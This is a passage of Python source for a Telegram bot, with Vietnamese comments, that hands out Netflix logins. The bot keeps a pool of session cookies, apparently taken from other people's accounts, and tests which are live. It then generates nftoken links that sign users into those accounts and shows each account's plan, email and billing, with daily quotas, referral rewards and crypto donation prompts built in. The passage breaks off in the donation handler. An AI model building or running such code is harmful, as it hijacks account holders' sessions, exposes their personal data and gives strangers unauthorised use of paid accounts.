"""
Telegram handlers for the simplified Netflix login bot.
"""

import asyncio
import io
import os
import time
import logging
import re
import zipfile
from datetime import datetime
from html import escape
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.error import Forbidden, BadRequest
from telegram.ext import ContextTypes
from telegram.constants import ParseMode

from config import (
    ADMIN_IDS, GROUP_USERNAME, GROUP_USERNAMES, DAILY_LIMIT, REF_BONUS_PER_REF, REF_DAILY_CAP,
CHECKIN_MILESTONE_DAYS, CHECKIN_MILESTONE_BONUS,
    BOT_USERNAME, CURRENCY_MAP, BASE_DIR, COOKIE_FILE,
    DONATE_QR_URL, BINANCE_PAY_ID, USDT_BEP20_ADDRESS,
    COOKIE_UPLOAD_WINDOW, ZIP_FILE_LIMIT,
    ADMIN_TAG,
)
from lang import t
from storage import (
    load_cookies,
    get_random_index, mark_dead, mark_permanent_dead, release_index, delete_cookie,
    get_cookie_line, get_cookie_stats,
    get_user, set_user_lang, get_user_lang, get_total_users, delete_user,
    record_use, get_checkin_streak, get_checkin_bonus, do_checkin,
    get_ref_bonus, get_ref_today, add_referral,
    get_uses_left, consume_use, add_uses, get_next_refill_time,
    create_gift_code, redeem_gift_code, get_user_daily_limit,
    get_today_uses,
    get_all_user_ids,
    pop_link_buffer, push_link_buffer, get_link_buffer_stats,
    get_buffer_source_indices,
    mark_nftoken_good, mark_nftoken_blocked, get_bot_stats,
    add_cookies, _extract_netflix_id,
)

logger = logging.getLogger("NetflixBot")
_executor = ThreadPoolExecutor(max_workers=4)
_active_sessions = {}
_feedback_jobs = {}
_pending_join = {}  # user_id -> (chat_id, message_id) — message prompt join đang hiển thị
_get_inflight_users = set()
_inflight_lock = None  # lazy-init asyncio.Lock
_pending_ref_global = {}  # ref deep-link click trong group → (referrer_id, ts) → credit khi user /start ở DM
_PENDING_REF_TTL = 24 * 3600  # dọn entry cũ sau 24h nếu user chưa bao giờ /start ở DM
FEEDBACK_DELAY_SECONDS = 30 * 60


def _build_device_links(link: str) -> dict:
    """Bóc token từ link nftoken → link login (token URL-encoded, chuẩn iOS Argo)."""
    m = re.search(r"nftoken=([^&\s]+)", link or "")
    if not m:
        return {}
    token = m.group(1)
    # Nếu link đã encode thì giữ nguyên; nếu raw (chứa + /) thì encode lại
    if token in ("+", "/") or ("+" in token or "/" in token):
        try:
            token = quote(token, safe="")
        except Exception:
            pass
    login_url = f"https://www.netflix.com/login?nftoken={token}"
    return {
        "pc": f"https://netflix.com/?nftoken={token}",
        "phone": f"https://netflix.com/unsupported?nftoken={token}",
        "tv": f"https://netflix.com/tv2?nftoken={token}",
    }


def _build_loginlink_message(link: str, payload: dict, user_id: int, lang: str, bonus: int = 0) -> str:
    """Tin nhắn kết quả nhận link — format chuẩn (Plan/Mail/Hạn + 3 link thiết bị)."""
    plan = (payload or {}).get("plan") or "-"
    email = (payload or {}).get("email") or "-"
    billing = (payload or {}).get("billing") or "-"

    links = _build_device_links(link)
    admin_url = "https://t.me/" + ADMIN_TAG.lstrip("@")
    lines = [
        t("link_header", lang),
        "",
        t("link_plan", lang, plan=escape(str(plan))),
        t("link_mail", lang, email=escape(str(email))),
        t("link_han", lang, billing=escape(str(billing))),
        "",
        t("link_title", lang),
    ]
    if links:
        lines.append(
            t("link_devices", lang, pc=links['pc'], phone=links['phone'], tv=links['tv'])
        )
    else:
        lines.append(f"<code>{escape(link)}</code>")
    lines.append("")
    lines.append(t("link_expire", lang))

    if user_id in ADMIN_IDS:
        lines.append(t("link_remaining_inf", lang))
    else:
        limit = get_user_daily_limit(user_id)
        left = get_uses_left(user_id)
        lines.append(t("link_remaining", lang, left=left, limit=limit))

    if bonus > 0:
        lines.append(t("link_bonus", lang, bonus=bonus))

    lines.append(t("link_admin", lang, admin=f'<a href="{admin_url}">Admin</a>'))

    return "\n".join(lines)


# ═══════════════════════════════════════════════════════════════════
#  Keyboards
# ═══════════════════════════════════════════════════════════════════

def lang_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("\U0001f1fb\U0001f1f3 Ti\u1ebfng Vi\u1ec7t", callback_data="lang_vi"),
         InlineKeyboardButton("\U0001f1ec\U0001f1e7 English", callback_data="lang_en")],
    ])


def main_keyboard(lang, user_id=None):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(t("btn_loginlink", lang), callback_data="loginlink_input")],
        [InlineKeyboardButton(t("btn_checkin", lang), callback_data="checkin_input"),
         InlineKeyboardButton(t("btn_ref", lang), callback_data="ref_input")],
        [InlineKeyboardButton(t("btn_stats", lang), callback_data="stats_input"),
         InlineKeyboardButton(t("btn_coffee", lang), callback_data="donate")],
        [InlineKeyboardButton(t("btn_lang", lang), callback_data="change_lang"),
         InlineKeyboardButton(t("btn_help", lang), callback_data="help_input")],
    ])


def back_keyboard(lang):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(t("btn_back", lang), callback_data="back")],
    ])


def result_keyboard(lang):
    """Keyboard cho message kết quả login link — Quay lại = gửi menu mới, giữ message kết quả."""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(t("btn_back", lang), callback_data="back_new_menu")],
    ])


def join_group_keyboard(lang, missing=None):
    """Keyboard shown when user hasn't joined all groups yet — chỉ hiện nút nhóm còn thiếu."""
    missing = missing if missing else GROUP_USERNAMES
    buttons = []
    for g in missing:
        clean = g.lstrip("@")
        buttons.append([InlineKeyboardButton(t("btn_join_group", lang, group=f"@{clean}"), url=f"https://t.me/{clean}")])
    buttons.append([InlineKeyboardButton(t("btn_check_joined", lang), callback_data="check_joined")])
    return InlineKeyboardMarkup(buttons)


# ═══════════════════════════════════════════════════════════════════
#  Admin UI
# ═══════════════════════════════════════════════════════════════════

ADMIN_CALLBACKS = {
    "admin_import_cookie",
    "admin_loadcookies",
    "admin_loadproxy",
    "admin_addproxy",
    "admin_stats",
}


def admin_keyboard(lang="vi"):
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton(t("admin_btn_import", lang), callback_data="admin_import_cookie"),
            InlineKeyboardButton(t("admin_btn_loadcookies", lang), callback_data="admin_loadcookies"),
        ],
        [
            InlineKeyboardButton(t("admin_btn_addproxy", lang), callback_data="admin_addproxy"),
            InlineKeyboardButton(t("admin_btn_loadproxy", lang), callback_data="admin_loadproxy"),
        ],
        [InlineKeyboardButton(t("admin_btn_stats", lang), callback_data="admin_stats")],
    ])


# ═══════════════════════════════════════════════════════════════════
#  Group check
# ═══════════════════════════════════════════════════════════════════

async def check_user_in_group(bot, user_id):
    """User phải tham gia TẤT CẢ các nhóm trong GROUP_USERNAMES."""
    missing = []
    for g in GROUP_USERNAMES:
        try:
            member = await bot.get_chat_member(f"@{g}", user_id)
            if member.status not in ("member", "administrator", "creator"):
                missing.append(f"@{g}")
        except Exception:
            missing.append(f"@{g}")
    return missing


async def cmd_chat_member(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Auto-mở khi user vừa join đủ nhóm/kênh (bot phải làm admin mới nhận được update này)."""
    cm = update.chat_member
    if not cm:
        return

    # Chỉ xử lý join vào nhóm/kênh trong danh sách yêu cầu
    chat_uname = (getattr(cm.chat, "username", None) or "").lower()
    if chat_uname not in GROUP_USERNAMES:
        return

    # Bỏ qua thay đổi tư cách của chính bot (ví dụ khi admin add/promote bot)
    if cm.new_chat_member.user.id == context.bot.id:
        return

    if cm.new_chat_member.status not in ("member", "administrator", "creator"):
        return

    user = cm.from_user
    if not user:
        return

    lang = get_user_lang(user.id) or "vi"
    missing = await check_user_in_group(context.bot, user.id)
    logger.info(f"[ChatMember] user {user.id} joined @{chat_uname}, missing={missing}")

    if missing:
        # Còn thiếu nhóm — cập nhật prompt đang hiển thị (bỏ nhóm đã join, chỉ còn nhóm thiếu)
        pending = _pending_join.get(user.id)
        if pending:
            try:
                await context.bot.edit_message_text(
                    chat_id=pending[0], message_id=pending[1],
                    text=_join_required_text(lang, missing),
                    parse_mode=ParseMode.HTML,
                    reply_markup=join_group_keyboard(lang, missing),
                    disable_web_page_preview=True,
                )
            except Exception:
                pass
        return

    # Đã đủ tất cả nhóm → tự mở
    name = user.first_name or user.username or "User"
    welcome_text = t("welcome", lang, name=name, group=GROUP_USERNAME)
    # Đã qua gate đủ nhóm → credit ref nếu có pending (fix: trước đây không credit ở đường này)
    await _credit_pending_ref(user.id, context, lang, user_name=name)
    pending = _pending_join.get(user.id)
    if pending:
        _clear_join_prompt(user.id)
        try:
            await context.bot.edit_message_text(
                chat_id=pending[0], message_id=pending[1],
                text=welcome_text,
                parse_mode=ParseMode.HTML,
                reply_markup=main_keyboard(lang, user.id),
                disable_web_page_preview=True,
            )
            return
        except Exception:
            pass
    try:
        await context.bot.send_message(
            chat_id=user.id,
            text=welcome_text,
            parse_mode=ParseMode.HTML,
            reply_markup=main_keyboard(lang, user.id),
            disable_web_page_preview=True,
        )
    except Exception:
        pass


def _new_session_id(user_id):
    return f"{user_id}-{int(time.time())}"


def _save_active_session(user_id, lang, payload):
    session_id = _new_session_id(user_id)
    _active_sessions[user_id] = {
        "session_id": session_id,
        "lang": lang,
        "created_at": int(time.time()),
        **(payload or {}),
    }
    return session_id


def _schedule_feedback_prompt(job_queue, user_id, lang, session_id):
    old = _feedback_jobs.get(user_id)
    if old:
        try:
            old.schedule_removal()
        except Exception:
            pass

    job = job_queue.run_once(
        _send_feedback_prompt,
        when=FEEDBACK_DELAY_SECONDS,
        data={"user_id": user_id, "lang": lang, "session_id": session_id},
        name=f"feedback_{user_id}",
    )
    _feedback_jobs[user_id] = job


def _cancel_feedback_job(user_id):
    old = _feedback_jobs.pop(user_id, None)
    if old:
        try:
            old.schedule_removal()
        except Exception:
            pass


async def _send_feedback_prompt(context: ContextTypes.DEFAULT_TYPE):
    data = context.job.data or {}
    user_id = data.get("user_id")
    lang = data.get("lang") or "vi"
    session_id = data.get("session_id")
    active = _active_sessions.get(user_id)
    if not active or active.get("session_id") != session_id:
        return

    # Auto-recheck session sau 30 phút — im lặng, chỉ báo khi phiên hỏng
    loop = asyncio.get_event_loop()
    re_status, re_text, re_cookie_file_text, re_payload = await loop.run_in_executor(
        _executor, _recheck_active_cookie, active, user_id
    )

    if re_status == "LIVE":
        # Phiên vẫn hoạt động → không nhắn gì, chỉ dừng job
        _cancel_feedback_job(user_id)
        return

    if re_status == "DEAD":
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=t("feedback_dead", lang),
            )
        except Exception:
            pass
        _cancel_feedback_job(user_id)
        return

    # ERROR or other status
    try:
        await context.bot.send_message(
            chat_id=user_id,
            text=t("feedback_error", lang),
        )
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════════
#  /start -- Language picker or Welcome
# ═══════════════════════════════════════════════════════════════════

def _pop_pending_ref_global(user_id: int):
    """Lấy ref pending từ click trong group; bỏ qua nếu đã quá TTL."""
    entry = _pending_ref_global.pop(user_id, None)
    if not entry:
        return None
    referrer_id, ts = entry
    if time.time() - ts > _PENDING_REF_TTL:
        return None
    return referrer_id


def _cleanup_stale_pending_refs():
    """Dọn entry ref click trong group cũ hơn TTL (chống rò rỉ bộ nhớ)."""
    now = time.time()
    for uid in [u for u, (_, ts) in _pending_ref_global.items() if now - ts > _PENDING_REF_TTL]:
        _pending_ref_global.pop(uid, None)


async def _credit_pending_ref(user_id: int, context: ContextTypes.DEFAULT_TYPE, lang: str, user_name: str = None) -> bool:
    """Credit referral cho user ĐÃ qua gate đủ nhóm. Gửi thông báo qua bot.send_message (không cần message)."""
    referrer_id = context.user_data.get("pending_ref")
    if not referrer_id:
        referrer_id = _pop_pending_ref_global(user_id)
    if not referrer_id:
        return False
    context.user_data["pending_ref"] = None
    _cleanup_stale_pending_refs()

    if referrer_id == user_id:
        logger.info(f"[Ref] user {user_id} tried to self-refer — skipped")
        return False

    ref_ok = add_referral(referrer_id, user_id)
    logger.info(
        f"[Ref] user {user_id} confirmed via ref from {referrer_id} -> ok={ref_ok}"
    )
    if ref_ok:
        try:
            ref_name = user_name or (get_user(user_id).get("first_name")
                                     or get_user(user_id).get("username") or "User")
            await context.bot.send_message(
                chat_id=referrer_id,
                text=t("ref_got", get_user_lang(referrer_id) or "vi",
                       ref_today=get_ref_today(referrer_id),
                       max_ref=REF_DAILY_CAP,
                       bonus_per_ref=REF_BONUS_PER_REF, name=ref_name),
                parse_mode=ParseMode.HTML,
            )
        except Exception as e:
            logger.warning(f"[Ref] notify referrer failed: {e}")
        try:
            ref_name = user_name or (get_user(user_id).get("first_name")
                                     or get_user(user_id).get("username") or "User")
            await context.bot.send_message(
                chat_id=user_id,
                text=t("ref_new", lang, name=ref_name),
            )
        except Exception:
            pass
    return ref_ok


async def _process_pending_ref(update: Update, context: ContextTypes.DEFAULT_TYPE, lang: str):
    """Credit referral stored in user_data['pending_ref'] (nếu có). User đã qua gate nhóm ở caller."""
    user = update.effective_user
    if not user:
        return False
    return await _credit_pending_ref(user.id, context, lang)


def _join_required_text(lang: str, missing: list) -> str:
    missing_list = "\n".join(f"• {g}" for g in missing)
    return t("join_required", lang, missing_list=missing_list)


def _track_join_prompt(user_id: int, chat_id: int, message_id: int):
    _pending_join[user_id] = (chat_id, message_id)


def _clear_join_prompt(user_id: int):
    _pending_join.pop(user_id, None)


async def _safe_edit_message(context, chat_id: int, message_id: int, **kwargs):
    """Edit message, bỏ qua lỗi 'Message is not modified' & các lỗi tạm thời."""
    try:
        await context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, **kwargs)
    except BadRequest as e:
        if "Message is not modified" not in str(e):
            logger.warning(f"edit_message_text failed: {e}")
    except Exception as e:
        logger.warning(f"edit_message_text failed: {e}")


# ═══════════════════════════════════════════════════════════════════
#  Redirect lệnh trong group/channel → inbox riêng
# ═══════════════════════════════════════════════════════════════════

def _group_redirect_reply(lang: str, name: str):
    """Text + nút 'Nhắn tin riêng với bot' cho tin nhắn trong group/channel."""
    return t("group_redirect", lang, name=name), InlineKeyboardMarkup([
        [InlineKeyboardButton(
            t("btn_private_chat", lang),
            url=f"https://t.me/{BOT_USERNAME.lstrip('@')}",
        )],
    ])


def _user_display(user) -> str:
    """Hiển thị tên: ưu tiên @username, fallback first_name."""
    if user and user.username:
        return f"@{user.username}"
    return (user.first_name if user and user.first_name else "bạn")


async def cmd_group_redirect(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Bắt mọi lệnh gõ trong group/supergroup/channel: báo nhẹ trong nhóm,
    kèm nút nhắn tin riêng. Bot ở trong nhóm chỉ để check join."""
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg or not msg.text:
        return

    # Ref deep-link click trong nhóm → credit khi user /start ở DM
    if context.args and msg.text.strip().lower().startswith("/start"):
        arg = context.args[0].strip().lower()
        if arg.startswith("ref_") and arg[4:].isdigit():
            _pending_ref_global[user.id] = (int(arg[4:]), time.time())
            _cleanup_stale_pending_refs()

    lang = get_user_lang(user.id) or "vi"
    text, markup = _group_redirect_reply(lang, _user_display(user))
    await msg.reply_text(text, reply_markup=markup)


# ═══════════════════════════════════════════════════════════════════
#  /start
# ═══════════════════════════════════════════════════════════════════

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return

    # Deep link referral: /start ref_<id> — parse EARLY before lang check
    if context.args:
        arg = context.args[0].strip().lower()
        if arg.startswith("ref_") and arg[4:].isdigit():
            referrer_id = int(arg[4:])
            if referrer_id != user.id:
                context.user_data["pending_ref"] = referrer_id

    lang = get_user_lang(user.id)
    if not lang:
        await msg.reply_text(
            "\U0001f310 Ch\u1ecdn ng\u00f4n ng\u1eef / Choose language:",
            reply_markup=lang_keyboard(),
        )
        return

    # Check if user has joined the group
    missing = await check_user_in_group(context.bot, user.id)
    if missing:
        sent = await msg.reply_text(
            _join_required_text(lang, missing),
            parse_mode=ParseMode.HTML,
            reply_markup=join_group_keyboard(lang, missing),
            disable_web_page_preview=True,
        )
        _track_join_prompt(user.id, sent.chat_id, sent.message_id)
        return

    # Process referral (pending from deep link)
    await _process_pending_ref(update, context, lang)

    name = user.first_name or user.username or "User"
    await msg.reply_text(
        t("welcome", lang, name=name, group=GROUP_USERNAME),
        parse_mode=ParseMode.HTML,
        reply_markup=main_keyboard(lang, user.id),
        disable_web_page_preview=True,
    )


# ═══════════════════════════════════════════════════════════════════
#  Cookie check & format (NO login link in output)
# ═══════════════════════════════════════════════════════════════════

HTTPONLY_COOKIE_NAMES = {"NetflixId", "SecureNetflixId", "gsid"}
SECURE_COOKIE_NAMES = {"SecureNetflixId", "NetflixId", "gsid"}


def _cookie_sort_key(name):
    priority = {
        "NetflixId": 0,
        "SecureNetflixId": 1,
        "nfvdid": 2,
        "gsid": 3,
    }
    return (priority.get(name, 99), name.lower())


def _to_netscape_cookie_line(name, value, expiry_epoch):
    domain = ".netflix.com"
    include_subdomains = "TRUE"
    path = "/"
    http_only = name in HTTPONLY_COOKIE_NAMES
    is_secure = "TRUE" if (http_only or name in SECURE_COOKIE_NAMES) else "FALSE"
    domain_field = f"#HttpOnly_{domain}" if http_only else domain
    return f"{domain_field}\t{include_subdomains}\t{path}\t{is_secure}\t{expiry_epoch}\t{name}\t{value}"


def _build_cookie_file_text(cookie_dict):
    clean_items = []
    for name, value in (cookie_dict or {}).items():
        if value is None:
            continue
        sval = str(value).strip().replace("\t", "%09").replace("\r", "").replace("\n", "")
        if not sval or sval == "-":
            continue
        clean_items.append((str(name), sval))

    clean_items.sort(key=lambda kv: _cookie_sort_key(kv[0]))
    expiry_epoch = int(time.time()) + (180 * 24 * 60 * 60)

    lines = [
        "# Netscape HTTP Cookie File",
        "# http://curl.haxx.se/rfc/cookie_spec.html",
        "# This file was generated by Cookie-Editor",
        "",
    ]

    for name, value in clean_items:
        lines.append(_to_netscape_cookie_line(name, value, expiry_epoch))

    lines.append("")
    return "\n".join(lines)


def _check_and_format(raw_cookie, user_id=None):
    """
    Check cookie and format account output.
    v3.0.2: Login link is NOT included in the output (separate /loginlink command).
    """
    from checker import check_cookie, parse_cookie_line

    def safe(val):
        if val is None:
            return "-"
        return escape(str(val))

    netflix_id, secure_id, extras = parse_cookie_line(raw_cookie)
    if not netflix_id:
        return None, "INVALID", None, None

    info = check_cookie(netflix_id, secure_id)
    
    # Kiểm tra status trực tiếp từ checker
    if info["status"] == "DEAD":
        membership = str(info.get("membershipStatus", "")).upper()
        # ANONYMOUS, FORMER_MEMBER, NEVER_MEMBER, NON_MEMBER → xóa vĩnh viễn ngay
        if membership in ("ANONYMOUS", "FORMER_MEMBER", "NEVER_MEMBER", "NON_MEMBER"):
            logger.info(f"Cookie PERM_DEAD - membershipStatus: {membership}")
            return None, "PERM_DEAD", None, None
        logger.info(f"Cookie DEAD detected by checker")
        return None, "DEAD", None, None
    if info["status"] == "ERROR":
        return None, "ERROR", None, None
    if str(info.get("membershipStatus", "")).upper() in ("FORMER_MEMBER", "ANONYMOUS", "NEVER_MEMBER", "NON_MEMBER"):
        logger.info(f"Membership shows {info.get('membershipStatus')}, marking PERM_DEAD")
        return None, "PERM_DEAD", None, None

    plan = str(info.get("plan", "")).lower()
    quality = str(info.get("videoQuality", "")).upper()  

    logger.info(f"Cookie is alive - {info.get('plan', 'Unknown')} ({quality})")

    cookie_dict = {"NetflixId": netflix_id}
    if secure_id:
        cookie_dict["SecureNetflixId"] = secure_id
    cookie_dict.update(extras)
    cookie_dict.update(info.get("_cookies") or {})

    country = info.get("country", "-")
    currency = CURRENCY_MAP.get(country, "?")
    membership = info.get("membershipStatus", "-")
    status_text = "Active" if membership in ("CURRENT_MEMBER", "-", "") else membership

    profiles = info.get("profiles", "-")
    profile_list = [p.strip() for p in str(profiles).split(",") if p.strip()] if profiles not in ("-", "") else []
    first_profile = profile_list[0] if profile_list else "-"

    num_profiles = int(info.get("numProfiles", 0) or 0)
    if num_profiles == 0 and profile_list:
        num_profiles = len(profile_list)

    owner = info.get("owner", "-")
    if owner == "-":
        owner = info.get("displayName", "-")

    phone = info.get("phone", "-")
    if phone == "-":
        phone = info.get("phoneNumber", "-")

    extra_members = "Yes" if info.get("extraMembers") else "No"

    lang = (get_user_lang(user_id) or "vi") if user_id else "vi"
    # v3.0.2: Simple output - chỉ hiển thị PLAN
    lines = [
        t("acc_header", lang),
        "─── 🔸 ───",
        "",
        t("acc_plan", lang, plan=safe(info.get('plan', '-')), quality=safe(info.get('videoQuality', '-'))),
        t("acc_region", lang, country=safe(country), currency=safe(currency)),
        t("acc_owner", lang, owner=safe(owner)),
        "",
        "─── 🔸 ───",
        t("acc_use_loginlink", lang),
    ]

    cookie_file_text = _build_cookie_file_text(cookie_dict)
    payload = {
        "netflix_id": netflix_id,
        "secure_id": secure_id,
        "cookie_dict": cookie_dict,
        "auth_url": info.get("authURL"),
    }
    return "\n".join(lines), "LIVE", cookie_file_text, payload


def _cookie_dead_policy(index, info, raw_cookie, user_id=None):
    """Chính sách xử lý cookie bị phát hiện DEAD (gọi khi check_cookie báo DEAD).

    - DEAD rõ ràng (membership FORMER/NON/NEVER/ANONYMOUS) → xoá vĩnh viễn ngay.
    - DEAD mơ hồ (redirect-to-login / no info — thường do proxy trả trang chặn)
      → xác minh lại qua IP VPS (không proxy):
        VPS LIVE → mark_dead (cookie còn sống, giữ lại, retry sau 1h)
        VPS DEAD → xoá vĩnh viễn (chết thật)
        VPS ERROR → mark_dead (không chắc, giữ retry)
    Trả về nhãn kết quả để log.
    """
    from checker import check_cookie, parse_cookie_line

    mem = str(info.get("membershipStatus", "") or "").upper()
    if mem in ("FORMER_MEMBER", "NON_MEMBER", "NEVER_MEMBER", "ANONYMOUS"):
        delete_cookie(index, user_id=user_id)
        return "DELETED"

    netflix_id, secure_id, extras = parse_cookie_line(raw_cookie)
    info2 = check_cookie(netflix_id, secure_id, direct=True)
    st2 = info2.get("status")
    if st2 == "LIVE":
        mark_dead(index, user_id=user_id)
        logger.info(f"Cookie #{index + 1} temp-dead (ambiguous, VPS=LIVE) - kept for retry")
        return "TEMP_DEAD_LIVE"
    if st2 == "DEAD":
        delete_cookie(index, user_id=user_id)
        return "DELETED_CONFIRMED"
    mark_dead(index, user_id=user_id)
    logger.info(f"Cookie #{index + 1} temp-dead (ambiguous, VPS={st2 or 'ERROR'}) - kept for retry")
    return "TEMP_DEAD_ERROR"


def _find_and_generate_login_link(user_id, lang="vi"):
    """
    Auto-find a random live cookie and generate login link.
    Returns (link, error, payload) — payload for saving active session.

    Ưu tiên: link có sẵn trong buffer (đã validate) → chỉ tốn < 1s.
    Nếu không có: gen on-demand + validate; token lỗi → cách ly cookie.
    """
    from checker import parse_cookie_line, check_cookie, generate_nftoken, validate_nftoken

    # 1) Dùng link đã validate sẵn trong buffer nếu có (FIFO, cookie đa dạng).
    buffered = pop_link_buffer()
    if buffered:
        logger.info("[LoginLink] Using buffered (pre-validated) link")
        return buffered["link"], None, buffered.get("payload") or None

    stats = get_cookie_stats(user_id=user_id)
    max_tries = min(stats["remaining"], 10)
    attempts = 0
    idle_waits = 0
    used_this_run = set()

    while attempts < max_tries:
        idx = get_random_index(user_id=user_id, exclude=used_this_run)
        if idx is None:
            idle_waits += 1
            if idle_waits > 10:
                break
            time.sleep(0.05)
            continue
        idle_waits = 0
        used_this_run.add(idx)

        raw = get_cookie_line(idx, user_id=user_id)
        if not raw:
            release_index(idx, user_id=user_id)
            continue

        attempts += 1
        logger.info(f"[LoginLink] Trying cookie #{idx + 1}... (attempt {attempts}/{max_tries})")

        netflix_id, secure_id, extras = parse_cookie_line(raw)
        if not netflix_id:
            release_index(idx, user_id=user_id)
            continue

        info = check_cookie(netflix_id, secure_id)

        if info.get("status") == "DEAD":
            _cookie_dead_policy(idx, info, raw, user_id=user_id)
            continue
        if info.get("status") == "ERROR":
            release_index(idx, user_id=user_id)
            time.sleep(1)
            continue
        if str(info.get("membershipStatus", "")).upper() == "FORMER_MEMBER":
            _cookie_dead_policy(idx, info, raw, user_id=user_id)
            continue

        # Cookie is LIVE — build cookie dict and generate nftoken
        cookie_dict = {"NetflixId": netflix_id}
        if secure_id:
            cookie_dict["SecureNetflixId"] = secure_id
        cookie_dict.update(extras)
        cookie_dict.update(info.get("_cookies") or {})

        token, error = generate_nftoken(cookie_dict)

        release_index(idx, user_id=user_id)

        if token:
            login_link = f"https://www.netflix.com/login?nftoken={quote(token, safe='')}"
            payload = {
                "netflix_id": netflix_id,
                "secure_id": secure_id,
                "cookie_dict": cookie_dict,
                "auth_url": info.get("authURL"),
                "plan": info.get("plan") or "-",
                "email": info.get("email") or "-",
                "billing": info.get("billing") or "-",
                "_cookie_index": idx,
                "source_index": idx,
                "raw_cookie": raw,
            }

            # Validate token theo luồng TV: /tv/out/success = OK (server thường trả
            # 200 shell → None = unknown, token vừa gen từ cookie LIVE nên vẫn gửi)
            v = validate_nftoken(token)
            if v is False:
                mark_nftoken_blocked(idx)
                logger.info(f"[LoginLink] Cookie #{idx + 1} token rejected (login redirect) - isolated")
                continue
            if v is True:
                mark_nftoken_good(idx)
            try:
                push_link_buffer(login_link, payload, validated=(v is True))
            except Exception as e:
                logger.warning(f"push_link_buffer failed: {e}")
            logger.info(f"[LoginLink] token validation={v} - sending")
            return login_link, None, payload
        else:
            # Token generation failed for this cookie, try next
            logger.info(f"[LoginLink] Cookie #{idx + 1} LIVE but nftoken failed: {error}")
            if error and "access denied" in str(error).lower():
                mark_nftoken_blocked(idx)
            continue

    return None, t("no_live_cookie", lang), None


def _recheck_active_cookie(active_session, user_id=None):
    """Re-check the exact cookie previously given to user."""
    if not active_session:
        return "ERROR", None, None, None



    idx = active_session.get("source_index")
    if idx is None:
        idx = active_session.get("_cookie_index")
    raw = None
    if idx is not None:
        raw = get_cookie_line(int(idx), user_id=user_id)
    if not raw:
        raw = active_session.get("raw_cookie")
    if not raw:
        return "ERROR", None, None, None

    text, status, cookie_file_text, payload = _check_and_format(raw, user_id=user_id)
    if status == "LIVE":
        payload = payload or {}
        payload["source_index"] = idx
        payload["_cookie_index"] = idx
        payload["raw_cookie"] = raw
        return "LIVE", text, cookie_file_text, payload

    if status in ("DEAD", "INVALID", "PERM_DEAD"):
        if idx is not None:
            if status == "PERM_DEAD":
                # Đã xác định rõ (membership) → xoá vĩnh viễn
                delete_cookie(int(idx), user_id=user_id)
            else:
                # DEAD/INVALID mơ hồ → xác minh lại qua VPS trước khi quyết định
                from checker import parse_cookie_line, check_cookie
                nid, sid, _ = parse_cookie_line(raw)
                info = check_cookie(nid, sid)
                _cookie_dead_policy(int(idx), info, raw, user_id=user_id)
        return "DEAD", None, None, None

    return "ERROR", None, None, None


# ═══════════════════════════════════════════════════════════════════
#  Button handler
# ═══════════════════════════════════════════════════════════════════

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user = update.effective_user
    lang = get_user_lang(user.id) or "vi"
    user_limit = DAILY_LIMIT

    # Chặn callback từ group/channel — bot chỉ hoạt động trong inbox riêng
    chat = query.message.chat if query.message else None
    if chat and chat.type != "private":
        try:
            text, markup = _group_redirect_reply(lang, _user_display(user))
            await query.message.reply_text(text, reply_markup=markup)
        except Exception:
            pass
        return

    # -- "Check Joined" button: verify group membership --
    if data == "check_joined":
        missing = await check_user_in_group(context.bot, user.id)
        if not missing:
            _clear_join_prompt(user.id)
            name = user.first_name or user.username or "User"
            await _process_pending_ref(update, context, lang)
            await _safe_edit_message(
                context, query.message.chat_id, query.message.message_id,
                text=t("welcome", lang, name=name, group=GROUP_USERNAME),
                parse_mode=ParseMode.HTML,
                reply_markup=main_keyboard(lang, user.id),
                disable_web_page_preview=True,
            )
        else:
            await _safe_edit_message(
                context, query.message.chat_id, query.message.message_id,
                text=_join_required_text(lang, missing),
                parse_mode=ParseMode.HTML,
                reply_markup=join_group_keyboard(lang, missing),
                disable_web_page_preview=True,
            )
            _track_join_prompt(user.id, query.message.chat_id, query.message.message_id)
        return

    # -- Group membership gate: block all actions if not in group --
    # Allow: language selection, back button, donate + admin callbacks
    if data not in ("lang_vi", "lang_en", "change_lang", "back", "donate", "donate_vietqr", "donate_binance", "help_input") and data not in ADMIN_CALLBACKS:
        missing = await check_user_in_group(context.bot, user.id)
        if missing:
            await _safe_edit_message(
                context, query.message.chat_id, query.message.message_id,
                text=_join_required_text(lang, missing),
                parse_mode=ParseMode.HTML,
                reply_markup=join_group_keyboard(lang, missing),
                disable_web_page_preview=True,
            )
            _track_join_prompt(user.id, query.message.chat_id, query.message.message_id)
            return

    # -- Help --
    if data == "help_input":
        await query.edit_message_text(
            t("help", lang),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=back_keyboard(lang),
        )
        return

    # -- Donate --
    if data == "donate":
        await query.answer()
        await query.edit_message_text(
            t("donate_menu", lang),
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(t("donate_btn_vietqr", lang), callback_data="donate_vietqr")],
                [InlineKeyboardButton(t("donate_btn_binance", lang), callback_data="donate_binance")],
                [InlineKeyboardButton(t("btn_back", lang), callback_data="back")],
            ]),
        )
        return

    if data == "donate_vietqr":
        await query.answer()
        try:
            await query.message.reply_photo(
                photo=DONATE_QR_URL,
                caption=t("donate_vietqr_caption", lang),
                parse_mode=ParseMode.HTML,
            )
        except Exception as e:
            logger.error(f"donate_vietqr photo error: {e}")
            await query.message.reply_text(t("qr_send_error", lang))
        return

    if data == "donate_binance":
        await query.answer()
        caption = t("donate_binance_caption", lang,
                    pay_id=BINANCE_PAY_ID, wallet=USDT_BEP20_ADDRESS)
        try:
            import segno
            buf = io.BytesIO()
            segno.make(USDT_BEP20_ADDRESS, error="m").save(
                buf, kind="png", scale=8, border=2)
